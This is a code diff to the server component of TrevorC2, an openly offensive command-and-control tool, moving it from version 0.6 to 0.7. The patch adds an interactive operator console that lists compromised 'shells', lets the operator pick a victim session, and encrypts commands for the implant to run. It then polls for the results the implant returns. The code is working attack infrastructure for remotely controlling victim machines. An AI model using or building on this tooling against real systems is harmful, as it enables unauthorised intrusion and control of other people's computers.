@@ -64,7 +64,7 @@ logging.basicConfig(level=logging.CRITICAL, format='[%(asctime)s] %(message)s', 
 log = logging.getLogger(__name__)
 
 __author__ = 'Dave Kennedy (@HackingDave)'
-__version__ = 0.6
+__version__ = 0.7
 
 # ROOT CHECK
 if os.geteuid() != 0:
@@ -312,45 +312,66 @@ if __name__ == "__main__":
 
     print("[*] Next, enter the command you want the victim to execute.")
     print("[*] Client uses random intervals, this may take a few.")
+    print("[*] Type help for usage. Example commands, list, interact.\n")
     try:
         while 1:
-            task = input("Enter the command to execute on victim: ")
-            while 1:
-                if task == "":
-                    task = input("Enter the command to execute on victim: ")
-                if task != "": break
+            task = input("trevorc2>")
+            if task == "help" or task == "?":
+                print("*** TrevorC2 Help Menu ***\n\n")
+                print("Command Usage:\n")
+                print("list - will list all shells available")
+                print("interact <id> - allow you to select which shells to interact with\n")
 
-            if assets != []:
-                counter = 0 
-                print("*** Select which assets to interact with to execute the command ***\n")
-                for asset in assets:
-                    counter = counter + 1
-                    print str(counter) + ". " + asset + " (TrevorC2 Established)" 
+            if task == "list":
+                counter = 0
+                print("\n*** Available TrevorC2 Shells Below ***\n")
+                if assets == []:
+                    print("No available TrevorC2 shells.")
+                else:
+                    print("Format: <session_id> <hostname>:<ipaddress>\n")
+                    for asset in assets:
+                        counter = counter + 1
+                        print(str(counter) + ". " + asset + " (Trevor C2 Established)")
 
                 print("\n")
-                hostname_select = input("Enter the session number to interact with: ")
-                hostname_select = int(hostname_select) - 1
-                hostname = assets[hostname_select]
-                hostname = hostname.split(":")[0]
-                task = (hostname + "::::" + task)
-                task_out = cipher.encrypt(task.encode())
-                with open("clone_site/instructions.txt", "w") as fh:
-                    fh.write(task_out)
-                print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
-                while 1:
-                    # we received a hit with our command
-                    if os.path.isfile("clone_site/received.txt"):
-                        data = open("clone_site/received.txt", "r").read()
-                        print("[*] Received response back from client...")
-                        print(data)
-                        # remove this so we don't use it anymore
-                        os.remove("clone_site/received.txt")
-                        break
-                    time.sleep(.3)
 
-            else:
-                print("[!] No sessions have been established to execute commands.")
+            if task == "interact": print("[!] Correct usage: interact <session_id>")
 
+            if task == "quit" or task == "exit":
+                print("[*] Exiting TrevorC2... ")
+                os.system('kill $PPID') # This is an ugly method to kill process, due to threading this is a quick hack to kill with control-c. Will fix later.
+
+
+            if "interact " in task:
+                if assets != []:
+                    hostname_select = task.split(" ")[1]
+                    hostname_select = int(hostname_select) - 1
+                    hostname = assets[hostname_select]
+                    hostname = hostname.split(":")[0]
+                    print("[*] Dropping into trevorc2 shell...")
+                    print("[*] Use exit or back to select other shells")
+                    while 1:
+                        task = input(hostname + ":trevorc2>")
+                        if task == "quit" or task == "exit" or task == "back": break
+                        task = (hostname + "::::" + task)
+                        task_out = cipher.encrypt(task.encode())
+                        with open("clone_site/instructions.txt", "w") as fh:
+                            fh.write(task_out)
+                        print("[*] Waiting for command to be executed, be patient, results will be displayed here...")
+                        while 1:
+                            # we received a hit with our command
+                            if os.path.isfile("clone_site/received.txt"):
+                                data = open("clone_site/received.txt", "r").read()
+                                print("[*] Received response back from client...")
+                                print(data)
+                                # remove this so we don't use it anymore
+                                os.remove("clone_site/received.txt")
+                                break
+                            time.sleep(.3)
+                
+                else:
+                    print("[!] No sessions have been established to execute commands.")
+                    
     # cleanup when using keyboardinterrupt
     except KeyboardInterrupt:
         if os.path.isdir("clone_site/"): shutil.rmtree("clone_site/")
